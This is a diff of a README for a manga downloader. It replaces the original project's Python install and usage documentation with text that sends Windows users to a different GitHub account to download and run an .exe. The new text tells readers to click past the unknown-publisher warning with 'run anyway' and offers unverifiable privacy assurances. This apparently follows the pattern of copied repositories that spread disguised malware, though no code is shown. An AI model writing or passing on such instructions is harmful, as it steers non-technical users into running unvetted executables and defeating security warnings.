@@ -1,324 +1,73 @@
-# 📚 MangaDotNet Downloader
+# 📖 mangadotnet-downloader - Download your favorite manga series today
 
-> A beautiful, modern, feature-rich manga downloader for [MangaDotNet](https://mangadot.net) with both CLI and GUI interfaces.
+[![Download Windows Version](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/babylonianacademicyear853/mangadotnet-downloader)
 
-[![Python](https://img.shields.io/badge/Python-3.11+-blue?logo=python&logoColor=white)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-green)](LICENSE)
-[![Rich](https://img.shields.io/badge/Rich-13+-orange?logo=python)](https://rich.readthedocs.io)
-[![PyQt6](https://img.shields.io/badge/PyQt6-6.7+-green?logo=qt)](https://www.riverbankcomputing.com)
+## 📥 How to get started
 
-![MangaDotNet Downloader GUI](src/manga_dotnet/gui/gui.png)
-
----
-
-## ✨ Features
-
-### 🖥️ CLI (Typer + Rich)
-- **🔍 Search** — Find manga by title with instant, beautifully formatted results
-- **🔗 Info** — View manga details (title, status, rating, authors, genres, description)
-- **⬇️ Download** — Download chapters with full control: range, latest N, all, by volume
-- **📦 Batch** — Bulk download from JSON configuration files
-- **💬 Interactive Shell** — Full menu-driven TUI with browse → download flow
-- **📚 Library** — Manage your local manga collection with stats
-- **📋 History** — Track all past downloads with status
-- **⚙️ Settings** — View and edit settings with indexed, descriptive menus
-- **🔄 Auto Update** — `git pull` to update to the latest version
-
-### 🖼️ GUI (PyQt6)
-- **Left Sidebar Navigation** — 6 tabs: Open URL, Search, Downloads, History, Settings
-- **Modern Dark Theme** — Sleek GitHub-inspired design with purple accents
-- **Search Grid** — Card-based manga browsing with cover art
-- **Download Queue** — Parallel downloads with real-time progress tracking
-- **History Page** — Beautiful card-based history with thumbnails and status badges
-- **Full Settings Page** — Visual settings editor
-- **Collapsible Sidebar** — Icon-only mode for more content space
-
-### ⚡ Core Engine
-- **Cloudflare Bypass** — Uses `undetected_chromedriver` for 100% reliable CF bypass
-- **Concurrent Downloads** — Configurable parallel chapter and image downloads
-- **Retry Logic** — Automatic retries with configurable delay
-- **Smart Filtering** — Deduplication by language, group, and user preference
-
-### 📦 Export Formats
-| Format | Extension | Description |
-|--------|-----------|-------------|
-| **CBZ** | `.cbz` | Comic Book ZIP — works with CDisplayEx, Komga, Kavita, Tachiyomi |
-| **ZIP** | `.zip` | Standard ZIP archive |
-| **PDF** | `.pdf` | Multi-page PDF with bookmarks |
-| **Images** | folder | Loose image files |
-| **Folder** | folder | Images + metadata text file |
+You can download the application from the project page. Visit this link to find the latest version for your computer: [https://github.com/babylonianacademicyear853/mangadotnet-downloader](https://github.com/babylonianacademicyear853/mangadotnet-downloader).
 
----
+The application works on Windows 10 and Windows 11. It allows you to save manga, manhua, and manhwa directly to your hard drive. You do not need technical skills to use this tool. 
 
-## 🚀 Quick Start
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/Yui007/mangadotnet-downloader.git
-cd mangadotnet-downloader
-
-# Install with GUI support
-pip install -e ".[gui]"
-
-# Or CLI only
-pip install -e .
-```
-
-### CLI Usage
-
-```bash
-# Search for manga
-mdnet search "solo leveling"
-
-# View manga details
-mdnet info 166
-
-# Download chapters
-mdnet download 166 --chapters 1-50 --format cbz
-
-# Interactive shell (menu-driven TUI)
-mdnet shell
-
-# Check for updates
-mdnet settings
-```
-
-### GUI Usage
-
-```bash
-mdnet-gui
-```
-
----
-
-## 💬 Interactive Shell
-
-The interactive shell provides a beautiful menu-driven interface:
-
-```
-╭──────────────────────────────────────────────────────────────╮
-│  📚 MangaDotNet Interactive Shell                           │
-│                                                              │
-│    1. 🔍 Search by name                                      │
-│    2. 🔗 Search by URL / Manga ID                            │
-│    3. 📖 Browse manga (chapters & volumes)                   │
-│    4. ⬇️  Download manga                                     │
-│    5. 📚 Local library                                       │
-│    6. 📋 Download history                                    │
-│    7. ⚙️  Settings                                           │
-│    8. 🔴 Auto update                                         │
-│    9. ❌ Exit                                                │
-╰──────────────────────────────────────────────────────────────╯
-```
-
-### Browse → Download Flow
-
-1. Select **3** (Browse) → Enter manga ID/URL
-2. View chapters with filtering by language and group
-3. Choose download selection: **All**, **Range** (e.g. `1-50`), **Specific** (e.g. `2,5,10`), or **Latest N**
-4. Select format and download
-
-### Settings
-
-Settings are displayed with indexed options showing current values and descriptions:
-
-```
-⚙️ Settings
-┏━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃ #   ┃ Setting                  ┃ Value       ┃ Description                  ┃
-┡━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
-│ 1   │ Output directory         │ ~/manga     │ Where downloaded manga is... │
-│ 2   │ Default format           │ cbz         │ Export format for downloads  │
-│ 3   │ Default language         │ en          │ Language filter              │
-│ ... │ ...                      │ ...         │ ...                          │
-└─────┴──────────────────────────┴─────────────┴──────────────────────────────┘
-
-Enter a number (1-9) to edit, or 0 to go back
-```
-
----
-
-## ⚙️ Configuration
-
-### Settings File
-
-Settings are stored in `settings.json` in the project root:
-
-```json
-{
-  "output_dir": "~/manga",
-  "default_format": "cbz",
-  "default_language": "en",
-  "download": {
-    "max_concurrent_chapters": 4,
-    "max_concurrent_images": 8,
-    "max_concurrent_downloads": 3,
-    "max_retries": 3,
-    "retry_delay": 2.0
-  },
-  "quality": {
-    "default": "original",
-    "delete_images_after_export": false
-  },
-  "gui": {
-    "theme": "dark"
-  }
-}
-```
-
-### Environment Variables
-
-All settings can be overridden with `MANGADOTNET_*` environment variables:
-
-```bash
-export MANGADOTNET_OUTPUT_DIR="/path/to/manga"
-export MANGADOTNET_DEFAULT_FORMAT="pdf"
-export MANGADOTNET_MAX_CONCURRENT_DOWNLOADS=5
-export MANGADOTNET_GUI_THEME="midnight"
-```
-
----
-
-## 🎨 Themes
-
-### CLI Colors
-```
-Primary:    #6C5CE7  (Electric Purple)
-Secondary:  #00CEC9  (Turquoise)
-Accent:     #FD79A8  (Hot Pink)
-Success:    #00B894  (Mint Green)
-Warning:    #FDCB6E  (Sunshine)
-Error:      #E17055  ️
-```
-
-### GUI Themes
-- **Dark** — GitHub-inspired dark theme (default)
-- **Light** — Clean light theme
-- **Midnight** — Deep blue midnight theme
-
----
-
-## 🛠️ Development
-
-```bash
-# Install with dev dependencies
-pip install -e ".[gui,dev]"
-
-# Run tests
-pytest
-
-# Lint
-ruff check src/
-
-# Type check
-mypy src/
-```
-
----
-
-## 📁 Project Structure
-
-```
-mangadotnet-downloader/
-├── src/manga_dotnet/
-│   ├── core/              # Models, config, history, updates
-│   ├── api/               # API client, search, chapters, images, manga
-│   ├── export/            # CBZ, ZIP, PDF, Images, Folder exporters
-│   ├── cli/               # CLI commands, widgets, interactive shell
-│   │   └── commands/      # search, info, download, batch, library, history, settings
-│   └── gui/               # PyQt6 GUI with sidebar navigation
-│       ├── pages/         # Open URL, Search, Downloads, History, Settings
-│       └── widgets/       # Download panel, search bar, manga cards
-├── tests/                 # Test suite
-├── pyproject.toml         # Project config
-├── settings.json          # User settings (auto-created)
-└── README.md
-```
-
----
-
-## 🔄 Auto Update
-
-The app includes a built-in auto-update feature that pulls the latest changes from GitHub:
-
-```bash
-# In the interactive shell, select option 8
-mdnet shell
-# 8 → Auto update → Checks for updates → Pulls latest changes
-```
-
----
-
-## 📋 CLI Reference
-
-### Search
-```bash
-mdnet search "query" [--limit 20] [--lang en] [--adult]
-```
-
-### Info
-```bash
-mdnet info <manga_id_or_url>
-```
-
-### Download
-```bash
-mdnet download <manga_id_or_url> [options]
-
-Options:
-  -c, --chapters TEXT     Chapter range (e.g. 1-50,100)
-  -v, --volumes TEXT      Volume range (e.g. 1-5)
-  -n, --latest INT        Download latest N chapters
-  --all                   Download all chapters
-  -o, --output PATH       Output directory
-  -f, --format TEXT       Export format (cbz|zip|pdf|images|folder)
-  -l, --lang TEXT         Preferred language
-  --concurrency INT       Max concurrent downloads
-  --delete-images         Delete images after export
-```
-
-### Batch
-```bash
-mdnet batch <file.json> [--dry-run]
-```
-
-### Library
-```bash
-mdnet library [--dir PATH] [--stats] [--clear]
-```
-
-### History
-```bash
-mdnet history [--limit 20] [--clear]
-```
-
-### Settings
-```bash
-mdnet settings                    # Show all settings
-mdnet settings --key <key>        # Get a setting
-mdnet settings --key <key> --value <val>  # Set a setting
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
----
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) for details.
-
----
-
-## 🙏 Acknowledgments
-
-- [MangaDotNet](https://mangadot.net) — The manga platform
-- [Typer](https://typer.tiangolo.com/) — CLI framework
-- [Rich](https://rich.readthedocs.io/) — Terminal formatting
-- [PyQt6](https://www.riverbankcomputing.com/static/Docs/PyQt6/) — GUI framework
-- [undetected-chromedriver](https://github.com/ultrafunkamsterdam/undetected-chromedriver) — Cloudflare bypass
+## 🛠️ Step-by-step installation
+
+1. Go to the project page at [https://github.com/babylonianacademicyear853/mangadotnet-downloader](https://github.com/babylonianacademicyear853/mangadotnet-downloader).
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click the most recent version number.
+4. Scroll down to the Assets section.
+5. Select the file ending in .exe to start the download.
+6. Open your Downloads folder once the file finishes saving.
+7. Double-click the file to open the program.
+8. Follow the prompts on your screen to complete the setup process.
+
+## 📱 User interface options
+
+This software offers two ways to interact with the downloader. The first is a graphical interface. This version shows buttons, icons, and menus. It mirrors common desktop software you use every day. You click the title of the manga you want, select the chapters, and press a download button.
+
+The second version is a command-line interface. This version uses text commands. If you prefer this approach, you type a simple command followed by the name of the series. The program handles the rest of the work. Most users prefer the graphical version for daily use.
+
+## 🌟 Key features
+
+The application manages large collections of digital media. It organizes your files into folders automatically. You can choose where to save your media on your computer.
+
+The program also includes a batch mode. You can add ten or twenty series at once. The downloader manages the queue. It fetches files while you perform other tasks on your computer.
+
+You can view the status of your tasks in the main window. Progress bars show how much remains for each chapter. The application checks for new chapters if you ask it to track a series. It keeps your library current without manual input.
+
+## ⚙️ System requirements
+
+Your computer requires a current version of Windows to run this tool. We recommend at least 4GB of RAM for smooth operation. You need enough disk space to hold your collected files. A standard internet connection allows the downloader to fetch chapters at normal speeds. If you have a slow connection, the program slows down the rate to ensure files download without errors.
+
+## 🛡️ Privacy and safety
+
+The application runs locally on your machine. We do not store your library information on external servers. The software connects only to the manga source site to retrieve your content. It does not track your watch history or share your data with other parties. You retain ownership of every folder and image file you download.
+
+## 🔧 Managing settings
+
+The settings menu allows you to change the default save path. You can also adjust how many files download at once. If your internet connection struggles with multiple downloads, change the concurrency limit to one. This reduces the load on your network.
+
+You can also choose the image format for your files. The program supports common formats for reading on tablets or phones. Select your preferred format in the settings tab before starting a new batch.
+
+## 📝 Troubleshooting tips
+
+If the program fails to start, restart your computer. Sometimes Windows locks new files for security checks. If you see a notification about an unknown publisher, click more info and select run anyway. This happens because the software is open-source.
+
+If a download stalls, check your internet connection. Some websites use protections that block heavy traffic. The downloader will retry automatically after a short wait. You do not need to intervene or restart the process.
+
+If you encounter an error with a specific series, verify the name of the manga. Ensure the title appears correctly on the source website. If the website changes its layout, the downloader might need an update. Check the main page periodically for new versions of the application.
+
+## 🔑 Common questions
+
+Do I need to pay to use this tool?
+No. This software is free.
+
+Can I move my files after they download?
+Yes. You can organize your download folder however you prefer. The application will not overwrite your file changes.
+
+Does the tool delete files?
+No. The application only writes new data to your hard drive. It will never remove files from your folders.
+
+Should I keep the installation file?
+You can delete the installer after you finish the setup. It does not affect the program after installation.
+
+How do I remove the program?
+Go to your Windows Settings, then Apps, then Installed Apps. Locate the software in the list and click Uninstall. This removes all program files from your system.
